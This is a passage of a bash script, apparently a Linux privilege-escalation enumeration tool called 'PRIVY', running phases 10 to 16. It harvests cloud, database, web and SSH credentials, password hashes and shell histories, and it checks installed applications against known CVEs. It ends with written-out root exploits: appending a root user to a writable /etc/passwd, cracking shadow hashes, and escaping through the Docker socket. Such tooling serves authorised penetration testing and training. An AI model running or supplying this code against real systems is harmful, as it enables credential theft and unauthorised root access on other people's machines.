    finding "SSH client config(s) found — may reveal hosts, users, and identity files!" "$keys"
    echo "$ssh_configs" | while read -r sc; do
        run_cmd "$sc" "cat $sc" "$keys"
    done
fi

sub_header ".htpasswd Files (web credentials)" "$keys"
run_cmd "find .htpasswd" "find /var/www /etc /home -name '.htpasswd' -readable 2>/dev/null" "$keys"
htpasswd_hits=$(find /var/www /etc /home -name '.htpasswd' -readable 2>/dev/null)
if [ -n "$htpasswd_hits" ]; then
    finding ".htpasswd file(s) found — may contain plaintext or reused passwords!" "$keys"
    echo "$htpasswd_hits" | while read -r hf; do
        run_cmd "$hf" "cat $hf" "$keys"
    done
fi

sub_header ".netrc Files (plaintext credentials)" "$keys"
run_cmd "find .netrc" "find / -name '.netrc' -type f 2>/dev/null" "$keys"
netrc_hits=$(find / -name '.netrc' -type f 2>/dev/null)
if [ -n "$netrc_hits" ]; then
    finding ".netrc file(s) found — may contain plaintext FTP/HTTP credentials!" "$keys"
    echo "$netrc_hits" | while read -r nf; do
        if [ -r "$nf" ]; then
            run_cmd "$nf" "cat $nf" "$keys"
        fi
    done
fi

sub_header "Cloud & Service Credentials" "$keys"
for credf in ~/.aws/credentials ~/.aws/config \
             ~/.config/gcloud/application_default_credentials.json \
             ~/.azure/credentials /run/secrets; do
    if [ -r "$credf" ]; then
        run_cmd "$credf" "cat $credf" "$keys"
        finding "Cloud/service credential file readable: $credf" "$keys"
    fi
done
run_cmd "find AWS cred files" "find / -name 'credentials' -path '*/.aws/*' 2>/dev/null" "$keys"
run_cmd "find gcloud configs" "find / -path '*/.config/gcloud/*' -name '*.json' 2>/dev/null | head -10" "$keys"

separator "$keys"
echo -e "${GRN}    [✓] Saved → ${WHT}$keys${RST}"
echo ""

# ============================================================================
#  10. MYSQL / DATABASE INFO
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 10: DATABASE / MYSQL / POSTGRESQL${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "MySQL / PostgreSQL Database Info" "$sql"

sub_header "MySQL Config Files" "$sql"
for cf in /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf; do
    if [ -r "$cf" ]; then
        run_cmd "$cf" "cat $cf" "$sql"
    fi
done

sub_header "Easy Access to MySQL? (mysql -u root)" "$sql"
mysql_result=$(mysql -u root -e 'SELECT User,Host,authentication_string FROM mysql.user;' 2>/dev/null)
if [ -n "$mysql_result" ]; then
    finding "We can connect to the local MYSQL service as 'root' and without a password!" "$sql"
    echo "$mysql_result" >> "$sql"
    echo "" >> "$sql"
    # Bonus enumeration since we're in
    sub_header "MySQL Databases (auto-enumerated)" "$sql"
    run_cmd "SHOW DATABASES" "mysql -u root -e 'SHOW DATABASES;'" "$sql"
    sub_header "MySQL Privileges" "$sql"
    run_cmd "SHOW GRANTS" "mysql -u root -e 'SHOW GRANTS;'" "$sql"
    run_cmd "FILE priv check" "mysql -u root -e 'SELECT user,file_priv FROM mysql.user WHERE file_priv=\"Y\";'" "$sql"
else
    echo "  MySQL root login without password: FAILED (good)." >> "$sql"
    echo -e "    ${YLW}[—] MySQL root no-password login failed${RST}"
    echo "" >> "$sql"
fi

sub_header "MySQL History" "$sql"
run_cmd "~/.mysql_history" "cat ~/.mysql_history" "$sql"

sub_header "Database Files on Disk" "$sql"
run_cmd "find .db/.sql files" "find / -name '*.db' -o -name '*.sql' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -20" "$sql"

sub_header "PostgreSQL Config" "$sql"
run_cmd "pg_hba.conf locations" "find / -name 'pg_hba.conf' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -5" "$sql"
pg_hba_path=$(find / -name 'pg_hba.conf' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -5)
for hba in $pg_hba_path; do
    if [ -r "$hba" ]; then
        run_cmd "$hba" "cat $hba" "$sql"
        # trust auth = no password required
        if grep -qE '^\s*(local|host)\s+\S+\s+\S+.*\btrust\b' "$hba" 2>/dev/null; then
            finding "pg_hba.conf has 'trust' auth entries — passwordless PostgreSQL access!" "$sql"
        fi
    fi
done
run_cmd "~/.pgpass" "cat ~/.pgpass 2>/dev/null" "$sql"
if [ -r ~/.pgpass ]; then
    finding "~/.pgpass is readable — contains stored PostgreSQL credentials!" "$sql"
fi
run_cmd "postgresql.conf" "find / -name 'postgresql.conf' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -3 | xargs cat 2>/dev/null" "$sql"

sub_header "PostgreSQL Unauthenticated Access" "$sql"
pg_result=$(psql -U postgres -c '\l' 2>/dev/null)
if [ -n "$pg_result" ]; then
    finding "Connected to PostgreSQL as 'postgres' without a password!" "$sql"
    echo "$pg_result" >> "$sql"
    echo "" >> "$sql"
    sub_header "PostgreSQL Auto-Enumeration" "$sql"
    run_cmd "List databases" "psql -U postgres -c '\l'" "$sql"
    run_cmd "List users/roles" "psql -U postgres -c '\du'" "$sql"
    run_cmd "Superuser check" "psql -U postgres -c 'SELECT usename,usesuper,usecreatedb FROM pg_user;'" "$sql"
    run_cmd "Version" "psql -U postgres -c 'SELECT version();'" "$sql"
    # Check for COPY TO PROGRAM (RCE as postgres user)
    copy_program=$(psql -U postgres -c "SELECT pg_catalog.has_function_privilege('pg_catalog.pg_ls_dir(text)', 'execute');" 2>/dev/null)
    run_cmd "COPY TO PROGRAM available" "psql -U postgres -c \"SELECT current_setting('is_superuser');\"" "$sql"
    pg_superuser=$(psql -U postgres -t -c "SELECT current_setting('is_superuser');" 2>/dev/null | tr -d ' ')
    if [ "$pg_superuser" = "on" ]; then
        finding "PostgreSQL 'postgres' user is a superuser — COPY TO PROGRAM gives OS command execution!" "$sql"
    fi
    # Check for plpgsql / untrusted languages
    run_cmd "Installed languages" "psql -U postgres -c 'SELECT lanname,lanpltrusted FROM pg_language;'" "$sql"
    untrusted_lang=$(psql -U postgres -t -c "SELECT lanname FROM pg_language WHERE lanpltrusted='f' AND lanname != 'internal' AND lanname != 'c';" 2>/dev/null | tr -d ' \n')
    if [ -n "$untrusted_lang" ]; then
        finding "Untrusted procedural language installed: $untrusted_lang — potential code execution inside DB!" "$sql"
    fi
else
    echo "  PostgreSQL postgres login without password: FAILED (good)." >> "$sql"
    echo -e "    ${YLW}[—] PostgreSQL no-password login failed${RST}"
    echo "" >> "$sql"
fi

sub_header "PostgreSQL History" "$sql"
run_cmd "~/.psql_history" "cat ~/.psql_history 2>/dev/null" "$sql"

separator "$sql"
echo -e "${GRN}    [✓] Saved → ${WHT}$sql${RST}"
echo ""

# ============================================================================
#  11. INTERESTING FILES & LOGS
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 11: INTERESTING FILES & LOGS${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Interesting Files & Logs" "$logs"

sub_header "Writable Configs in /etc/" "$logs"
run_cmd "World-writable in /etc" "find /etc/ -writable -type f 2>/dev/null" "$logs"
writable_etc=$(find /etc/ -writable -type f 2>/dev/null)
if [ -n "$writable_etc" ]; then
    finding "World-writable files found in /etc/ — config tampering possible!" "$logs"
fi

sub_header "Web Server Roots" "$logs"
for webdir in /var/www /var/www/html /srv/www /opt/lampp/htdocs /usr/local/www; do
    if [ -d "$webdir" ]; then
        run_cmd "ls $webdir" "ls -laR $webdir 2>/dev/null | head -40" "$logs"
    fi
done

sub_header "Config Files with Passwords" "$logs"
run_cmd "find config files" "find / -maxdepth 4 -name '*.conf' -o -name '*.config' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -30" "$logs"
run_cmd "grep 'password' in /etc" "grep -rl 'password' /etc/ 2>/dev/null | head -20" "$logs"
run_cmd "grep creds in /var/www" "grep -rIl --include='*.php' --include='*.conf' --include='*.config' --include='*.ini' --include='*.env' --include='*.yml' --include='*.yaml' -E 'password|passwd|api[_-]?key|secret|token' /var/www/ 2>/dev/null | head -20" "$logs"

sub_header "Log Files" "$logs"
for logf in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure \
            /var/log/apache2/access.log /var/log/apache2/error.log \
            /var/log/httpd/access_log /var/log/httpd/error_log \
            /var/log/nginx/access.log /var/log/nginx/error.log \
            /var/log/dpkg.log /var/log/yum.log /var/log/faillog \
            /var/log/lastlog /var/log/wtmp; do
    if [ -r "$logf" ]; then
        run_cmd "$logf (last 15 lines)" "tail -15 $logf" "$logs"
    fi
done

separator "$logs"
echo -e "${GRN}    [✓] Saved → ${WHT}$logs${RST}"
echo ""

# ============================================================================
#  12. FILE SYSTEM ENUMERATION
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 12: FILE SYSTEM${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "File System Enumeration" "$fs"

sub_header "Recently Modified Files (last 10 min)" "$fs"
run_cmd "find / -mmin -10" "find / -mmin -10 -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -30" "$fs"

sub_header "Hidden Files in /home and /tmp" "$fs"
run_cmd "Hidden in /home" "find /home -name '.*' -type f 2>/dev/null" "$fs"
run_cmd "Hidden in /tmp" "find /tmp -name '.*' -type f 2>/dev/null" "$fs"

sub_header "Backup Files" "$fs"
run_cmd "find *.bak *.old *.orig" "find / -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.save' -o -name '*~' 2>/dev/null | head -30" "$fs"

sub_header "Core Dumps" "$fs"
run_cmd "find core dumps" "find / -name 'core' -type f 2>/dev/null | head -10" "$fs"

sub_header "/var/backups (credential backups)" "$fs"
run_cmd "ls /var/backups" "ls -la /var/backups/ 2>/dev/null" "$fs"
for bakfile in /var/backups/passwd.bak /var/backups/shadow.bak \
               /var/backups/group.bak /var/backups/gshadow.bak; do
    if [ -r "$bakfile" ]; then
        run_cmd "$bakfile" "cat $bakfile" "$fs"
        finding "Backup credential file readable: $bakfile — may contain crackable hashes!" "$fs"
    fi
done

separator "$fs"
echo -e "${GRN}    [✓] Saved → ${WHT}$fs${RST}"
echo ""

# ============================================================================
#  13. SHELL HISTORIES
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 13: SHELL HISTORIES${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Shell Histories" "$history"

for histfile in ~/.bash_history ~/.zsh_history ~/.sh_history \
                ~/.nano_history ~/.mysql_history ~/.php_history \
                ~/.atftp_history ~/.wget-hsts ~/.lesshst \
                /root/.bash_history; do
    if [ -r "$histfile" ]; then
        run_cmd "$histfile (last 50)" "tail -50 $histfile" "$history"
        finding "Readable history file: $histfile" "$history"
    fi
done

separator "$history"
echo -e "${GRN}    [✓] Saved → ${WHT}$history${RST}"
echo ""

# ============================================================================
#  14. DEVELOPMENT TOOLS & UPLOAD VECTORS
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 14: DEV TOOLS & UPLOAD VECTORS${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Development Tools & File Transfer" "$devtools"

sub_header "Languages & Compilers" "$devtools"
for tool in python python3 python2 perl ruby gcc cc go java javac node php lua; do
    loc=$(which $tool 2>/dev/null)
    if [ -n "$loc" ]; then
        ver=$($tool --version 2>/dev/null | head -1)
        echo "  [FOUND] $tool → $loc  ($ver)" >> "$devtools"
        echo -e "    ${GRN}[✓] $tool → $loc${RST}"
    fi
done
echo "" >> "$devtools"

sub_header "File Transfer Tools" "$devtools"
for tool in wget curl nc ncat netcat socat tftp ftp scp ssh; do
    loc=$(which $tool 2>/dev/null)
    if [ -n "$loc" ]; then
        echo "  [FOUND] $tool → $loc" >> "$devtools"
        echo -e "    ${GRN}[✓] $tool → $loc${RST}"
    fi
done
echo "" >> "$devtools"

sub_header "Container / Virtualisation" "$devtools"
if [ -S /var/run/docker.sock ]; then
    finding "Docker socket is accessible at /var/run/docker.sock — container escape possible!" "$devtools"
fi
if [ -f /.dockerenv ]; then
    finding "Running inside a Docker container (/.dockerenv exists)" "$devtools"
fi
run_cmd "Docker socket" "ls -la /var/run/docker.sock" "$devtools"
run_cmd "docker ps" "docker ps" "$devtools"
run_cmd "lxc" "lxc list" "$devtools"
run_cmd "/.dockerenv" "ls -la /.dockerenv" "$devtools"
run_cmd "cgroup check" "cat /proc/1/cgroup" "$devtools"

separator "$devtools"
echo -e "${GRN}    [✓] Saved → ${WHT}$devtools${RST}"
echo ""

# ============================================================================
#  15. THIRD-PARTY APPLICATION CVE CHECK
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 15: THIRD-PARTY APPLICATION CVE CHECK${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

section_header "Third-Party Application CVE Check" "$thirdparty"

# version less-than: returns 0 if $1 < $2
_ver_lt() {
    [ "$1" = "$2" ] && return 1
    [ "$(printf '%s\n' "$1" "$2" | sort -V | head -1)" = "$1" ]
}

_extract_ver() {
    echo "$1" | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1
}

# Accumulate vulnerable app tags for exploit phase
thirdparty_vulns=""

# --- Gogs ---
sub_header "Gogs (git server)" "$thirdparty"
gogs_bin=$(find /opt/gogs /opt /srv /usr/local -name 'gogs' -type f 2>/dev/null | head -1)
gogs_ver=""
if [ -n "$gogs_bin" ]; then
    gogs_ver=$(_extract_ver "$("$gogs_bin" --version 2>/dev/null)")
    echo "  [FOUND] Gogs: $gogs_bin  (v${gogs_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Gogs found: $gogs_bin (v${gogs_ver:-unknown})${RST}"
    if [ -n "$gogs_ver" ]; then
        if _ver_lt "$gogs_ver" "0.13.0"; then
            finding "Gogs $gogs_ver — CVE-2024-39930/31/32/33: Multiple RCE/auth bypass/SSRF (< 0.13.0)" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}GOGS_RCE_2024:${gogs_ver}:${gogs_bin}\n"
        fi
        if _ver_lt "$gogs_ver" "0.12.6"; then
            finding "Gogs $gogs_ver — CVE-2022-0415: Git hook RCE authenticated (< 0.12.6)" "$thirdparty"
        fi
        if _ver_lt "$gogs_ver" "0.11.66"; then
            finding "Gogs $gogs_ver — CVE-2018-15192: SSRF (< 0.11.66)" "$thirdparty"
        fi
    fi
    writable_hooks=$(find /opt/gogs /home /srv -path '*/repositories/*.git/hooks/*' -writable -type f 2>/dev/null | head -5)
    if [ -n "$writable_hooks" ]; then
        finding "Writable Gogs git hook(s) — inject commands, trigger on git push!" "$thirdparty"
        echo "$writable_hooks" | while read -r h; do echo "       → $h" >> "$thirdparty"; done
    fi
    gogs_user=$(ps aux 2>/dev/null | grep '[g]ogs' | awk '{print $1}' | head -1)
    if [ "$gogs_user" = "root" ]; then
        finding "Gogs process runs as root — any code execution gives immediate root!" "$thirdparty"
    else
        echo "  Gogs runs as: ${gogs_user:-unknown}" >> "$thirdparty"
    fi
else
    echo "  Gogs: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Gitea ---
sub_header "Gitea (git server)" "$thirdparty"
gitea_bin=$(find /opt/gitea /opt /usr/local/bin /srv -name 'gitea' -type f 2>/dev/null | head -1)
gitea_ver=""
if [ -n "$gitea_bin" ] || pgrep -f 'gitea' >/dev/null 2>&1; then
    [ -z "$gitea_bin" ] && gitea_bin="(process only)"
    if [ "$gitea_bin" != "(process only)" ]; then
        gitea_ver=$(_extract_ver "$("$gitea_bin" --version 2>/dev/null)")
    fi
    echo "  [FOUND] Gitea: $gitea_bin  (v${gitea_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Gitea found (v${gitea_ver:-unknown})${RST}"
    if [ -n "$gitea_ver" ]; then
        if _ver_lt "$gitea_ver" "1.22.0"; then
            finding "Gitea $gitea_ver — multiple security fixes in 1.22.0 including CSRF/account takeover — check Gitea security advisories for exact CVEs" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}GITEA_CSRF:${gitea_ver}:${gitea_bin}\n"
        fi
        if _ver_lt "$gitea_ver" "1.16.5"; then
            finding "Gitea $gitea_ver — CVE-2022-1058: Open redirect (< 1.16.5)" "$thirdparty"
        fi
    fi
else
    echo "  Gitea: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Jenkins ---
sub_header "Jenkins (CI/CD)" "$thirdparty"
jenkins_war=$(find /opt /usr/share /var/lib/jenkins -name 'jenkins.war' 2>/dev/null | head -1)
jenkins_ver=""
if [ -n "$jenkins_war" ] || pgrep -f 'jenkins' >/dev/null 2>&1; then
    [ -z "$jenkins_war" ] && jenkins_war="(process only)"
    jenkins_ver=$(_extract_ver "$(unzip -p "$jenkins_war" META-INF/MANIFEST.MF 2>/dev/null | grep -i 'Jenkins-Version\|Implementation-Version')")
    echo "  [FOUND] Jenkins: $jenkins_war  (v${jenkins_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Jenkins found (v${jenkins_ver:-unknown})${RST}"
    if [ -n "$jenkins_ver" ]; then
        if _ver_lt "$jenkins_ver" "2.442"; then
            finding "Jenkins $jenkins_ver — CVE-2024-23897: Unauthenticated file read via CLI (< 2.442)" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}JENKINS_CVE_2024_23897:${jenkins_ver}:jenkins\n"
        fi
        if _ver_lt "$jenkins_ver" "2.393"; then
            finding "Jenkins $jenkins_ver — CVE-2023-27898: XSS to RCE (< 2.393)" "$thirdparty"
        fi
    fi
    for jpath in /var/lib/jenkins /opt/jenkins ~/.jenkins; do
        if [ -r "$jpath/credentials.xml" ]; then
            finding "Jenkins credentials.xml readable: $jpath/credentials.xml" "$thirdparty"
        fi
        if [ -r "$jpath/secrets/master.key" ]; then
            finding "Jenkins master.key readable: $jpath/secrets/master.key — can decrypt all stored credentials!" "$thirdparty"
        fi
    done
else
    echo "  Jenkins: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Grafana ---
sub_header "Grafana (monitoring)" "$thirdparty"
grafana_bin=$(which grafana-server 2>/dev/null || find /opt /usr/sbin /usr/share -name 'grafana-server' -type f 2>/dev/null | head -1)
grafana_ver=""
if [ -n "$grafana_bin" ] || pgrep -f 'grafana-server' >/dev/null 2>&1; then
    [ -z "$grafana_bin" ] && grafana_bin="(process only)"
    if [ "$grafana_bin" != "(process only)" ]; then
        grafana_ver=$(_extract_ver "$("$grafana_bin" --version 2>/dev/null)")
    fi
    echo "  [FOUND] Grafana: $grafana_bin  (v${grafana_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Grafana found (v${grafana_ver:-unknown})${RST}"
    if [ -n "$grafana_ver" ]; then
        if ! _ver_lt "$grafana_ver" "8.0.0" && _ver_lt "$grafana_ver" "8.3.1"; then
            finding "Grafana $grafana_ver — CVE-2021-43798: Unauthenticated path traversal/file read (8.0.0-8.3.0)!" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}GRAFANA_PATH_TRAV:${grafana_ver}:${grafana_bin}\n"
        fi
    fi
    for gconf in /etc/grafana/grafana.ini /usr/share/grafana/conf/defaults.ini; do
        if [ -r "$gconf" ]; then
            gf_secret=$(grep -E '^\s*(secret_key|admin_password)\s*=' "$gconf" 2>/dev/null | grep -v '^\s*;')
            if [ -n "$gf_secret" ]; then
                finding "Grafana config contains credentials: $gconf" "$thirdparty"
                echo "$gf_secret" | while read -r gl; do echo "       → $gl" >> "$thirdparty"; done
            fi
        fi
    done
else
    echo "  Grafana: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Nextcloud ---
sub_header "Nextcloud (file sharing)" "$thirdparty"
nextcloud_dir=$(find /var/www /opt /srv -maxdepth 3 -name 'version.php' -path '*/nextcloud/*' 2>/dev/null | head -1 | xargs -I{} dirname {} 2>/dev/null)
nextcloud_ver=""
if [ -n "$nextcloud_dir" ] || pgrep -f 'nextcloud' >/dev/null 2>&1; then
    [ -z "$nextcloud_dir" ] && nextcloud_dir="(process only)"
    if [ "$nextcloud_dir" != "(process only)" ] && [ -r "$nextcloud_dir/version.php" ]; then
        nextcloud_ver=$(_extract_ver "$(grep 'OC_Version\b\|OC_VersionString' "$nextcloud_dir/version.php" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')")
    fi
    echo "  [FOUND] Nextcloud: $nextcloud_dir  (v${nextcloud_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Nextcloud found (v${nextcloud_ver:-unknown})${RST}"
    if [ -n "$nextcloud_ver" ]; then
        # CVE-2023-48239: Nextcloud < 27.1.3 / 28.0.0-beta3 — improper auth bypass
        if _ver_lt "$nextcloud_ver" "27.1.3"; then
            finding "Nextcloud $nextcloud_ver — CVE-2023-48239: Auth bypass (< 27.1.3)" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}NEXTCLOUD_AUTH_BYPASS:${nextcloud_ver}:${nextcloud_dir}\n"
        fi
        # CVE-2024-37302: Nextcloud 28.x < 28.0.5 — SSRF via URL validation (no 27.x backport)
        if ! _ver_lt "$nextcloud_ver" "28.0.0" && _ver_lt "$nextcloud_ver" "28.0.5"; then
            finding "Nextcloud $nextcloud_ver — CVE-2024-37302: SSRF via URL validation (28.0.0-28.0.4)" "$thirdparty"
        fi
    fi
    # Config file may contain DB credentials
    for ncconf in "$nextcloud_dir/config/config.php" /var/www/nextcloud/config/config.php; do
        if [ -r "$ncconf" ]; then
            nc_creds=$(grep -E "dbpassword|dbuser|secret|password" "$ncconf" 2>/dev/null | grep -v '//')
            if [ -n "$nc_creds" ]; then
                finding "Nextcloud config.php readable and contains credentials: $ncconf" "$thirdparty"
                echo "$nc_creds" | while read -r nl; do echo "       → $nl" >> "$thirdparty"; done
            fi
        fi
    done
else
    echo "  Nextcloud: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Portainer ---
sub_header "Portainer (container management)" "$thirdparty"
portainer_bin=$(find /opt /usr/local/bin -name 'portainer' -type f 2>/dev/null | head -1)
portainer_ver=""
if [ -n "$portainer_bin" ] || pgrep -f 'portainer' >/dev/null 2>&1; then
    [ -z "$portainer_bin" ] && portainer_bin="(process only)"
    # portainer binary has no --version flag; check docker image tag instead
    portainer_ver=$(_extract_ver "$(docker inspect portainer 2>/dev/null | grep -oE '"Image":\s*"portainer/portainer[^"]*"' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)")
    [ -z "$portainer_ver" ] && portainer_ver=$(_extract_ver "$(docker ps --filter name=portainer --format '{{.Image}}' 2>/dev/null | head -1)")
    echo "  [FOUND] Portainer: $portainer_bin  (v${portainer_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Portainer found (v${portainer_ver:-unknown})${RST}"
    if [ -n "$portainer_ver" ]; then
        # CVE-2022-26960: Portainer < 2.11.1 — path traversal reading host files
        if _ver_lt "$portainer_ver" "2.11.1"; then
            finding "Portainer $portainer_ver — CVE-2022-26960: Path traversal, read host files (< 2.11.1)" "$thirdparty"
            thirdparty_vulns="${thirdparty_vulns}PORTAINER_PATH_TRAV:${portainer_ver}:${portainer_bin}\n"
        fi
        # CVE-2024-21626 (runc) — check if running containers affected
        finding "Portainer detected — verify runc version for CVE-2024-21626 (container breakout via /proc/self/fd, runc < 1.1.12)" "$thirdparty"
    fi
    # Check if Portainer data dir is readable (contains hashed admin password)
    for pdata in /data /opt/portainer/data; do
        if [ -r "$pdata/portainer.db" ]; then
            finding "Portainer database readable: $pdata/portainer.db — may contain hashed admin credentials!" "$thirdparty"
        fi
    done
else
    echo "  Portainer: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- MinIO ---
sub_header "MinIO (object storage)" "$thirdparty"
minio_bin=$(which minio 2>/dev/null || find /opt /usr/local/bin -name 'minio' -type f 2>/dev/null | head -1)
if [ -n "$minio_bin" ]; then
    minio_ver=$(_extract_ver "$("$minio_bin" --version 2>/dev/null)")
    echo "  [FOUND] MinIO: $minio_bin  (v${minio_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] MinIO found (v${minio_ver:-unknown})${RST}"
    minio_creds=$(ps auxww 2>/dev/null | grep '[m]inio' | grep -oE 'MINIO_(ROOT|ACCESS)_(USER|KEY|PASSWORD)=[^ ]+')
    if [ -n "$minio_creds" ]; then
        finding "MinIO credentials visible in process arguments!" "$thirdparty"
        echo "$minio_creds" | while read -r mc; do echo "       → $mc" >> "$thirdparty"; done
    fi
    finding "MinIO detected — check CVE-2023-28432 if version <= RELEASE.2023-03-13: POST /minio/health/cluster?verify leaks MINIO_ROOT_USER/PASSWORD unauthenticated (version detection unreliable for CalVer releases, verify manually)" "$thirdparty"
    thirdparty_vulns="${thirdparty_vulns}MINIO_INFO_LEAK:${minio_ver:-unknown}:${minio_bin}\n"
else
    echo "  MinIO: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Flowise ---
sub_header "Flowise (LLM workflow)" "$thirdparty"
flowise_pkg=$(find /opt /srv /usr/local -name 'package.json' -path '*flowise*' 2>/dev/null | head -1)
flowise_ver=""
if [ -n "$flowise_pkg" ] || pgrep -f 'flowise' >/dev/null 2>&1; then
    if [ -n "$flowise_pkg" ] && [ -r "$flowise_pkg" ]; then
        flowise_ver=$(jq -r '.version' "$flowise_pkg" 2>/dev/null || grep -oE '"version":\s*"[^"]*"' "$flowise_pkg" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?')
    fi
    echo "  [FOUND] Flowise: ${flowise_pkg:-running process}  (v${flowise_ver:-unknown})" >> "$thirdparty"
    echo -e "    ${GRN}[✓] Flowise found (v${flowise_ver:-unknown})${RST}"
    if [ -z "$flowise_ver" ] || _ver_lt "$flowise_ver" "3.0.6"; then
        finding "Flowise ${flowise_ver:-unknown} — CVE-2025-59528: Authenticated RCE via CustomMCP node (< 3.0.6)" "$thirdparty"
        finding "Flowise ${flowise_ver:-unknown} — CVE-2025-58434: Unauthenticated password reset token disclosure (< 3.0.6)" "$thirdparty"
        thirdparty_vulns="${thirdparty_vulns}FLOWISE_RCE:${flowise_ver:-unknown}:flowise\n"
    fi
else
    echo "  Flowise: not found" >> "$thirdparty"
fi
echo "" >> "$thirdparty"

# --- Generic /opt scan ---
sub_header "Unknown apps in /opt /srv" "$thirdparty"
run_cmd "ls /opt" "ls -la /opt/ 2>/dev/null" "$thirdparty"
run_cmd "ls /srv" "ls -la /srv/ 2>/dev/null" "$thirdparty"
for appdir in /opt/*/; do
    appname=$(basename "$appdir")
    case "$appname" in
        gogs|gitea|jenkins|grafana|minio|flowise|nextcloud|portainer|lampp) continue ;;
    esac
    [ -d "$appdir" ] || continue
    echo "  [APP] $appdir — enumerate manually (version/CVEs unknown)" >> "$thirdparty"
    echo -e "    ${YLW}[?] Unknown /opt app: $appdir${RST}"
    for vfile in "${appdir}VERSION" "${appdir}version.txt" "${appdir}package.json"; do
        [ -r "$vfile" ] && echo "      → $vfile: $(head -3 "$vfile" 2>/dev/null)" >> "$thirdparty"
    done
done

separator "$thirdparty"
echo -e "${GRN}    [✓] Saved → ${WHT}$thirdparty${RST}"
echo ""

# ============================================================================
#  16. EXPLOIT PATH SUGGESTIONS
# ============================================================================
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${MAG}  PHASE 16: EXPLOIT PATH SUGGESTIONS${RST}"
echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"

{
echo "======================================================================"
echo "  PRIVY — EXPLOIT PATH SUGGESTIONS"
echo "  Generated: $(date)"
echo "  Host: $(hostname) | User: $(whoami)"
echo "======================================================================"
echo ""
echo "  Priority key:"
echo "  [P1] Immediate — run it now"
echo "  [P2] Likely root — needs a step or two"
echo "  [P3] Investigate — depends on context"
echo ""
echo "======================================================================"
echo ""
} > "$exploit"

exploit_entry() {
    local priority="$1"
    local vector="$2"
    local steps="$3"
    case "$priority" in
        P1) echo -e "    ${RED}[P1]${RST} ${WHT}${vector}${RST}" ;;
        P2) echo -e "    ${YLW}[P2]${RST} ${WHT}${vector}${RST}" ;;
        P3) echo -e "    ${CYN}[P3]${RST} ${WHT}${vector}${RST}" ;;
    esac
    {
    echo "----------------------------------------------------------------------"
    echo "[${priority}] ${vector}"
    echo "----------------------------------------------------------------------"
    printf '%s\n' "${steps}"
    echo ""
    } >> "$exploit"
}

# ── P1: /etc/passwd writable ──────────────────────────────────────────────
if [ -w /etc/passwd ]; then
    exploit_entry "P1" "/etc/passwd is WRITABLE" \
"  Add a root-equivalent user:
  \$ echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd
  \$ su r00t   # password: pass123"
fi

# ── P1: /etc/shadow readable ──────────────────────────────────────────────
if check_readable /etc/shadow; then
    exploit_entry "P1" "/etc/shadow is READABLE" \
"  Unshadow and crack:
  \$ unshadow /etc/passwd /etc/shadow > hashes.txt
  \$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  \$ hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt"
fi

# ── P1: Docker socket ─────────────────────────────────────────────────────
if [ -S /var/run/docker.sock ]; then
    exploit_entry "P1" "Docker socket accessible" \
"  Mount the host filesystem inside a privileged container:
  \$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  No internet? Use an existing image:
  \$ docker run -v /:/mnt --rm -it \$(docker images -q | head -1) chroot /mnt sh"
fi

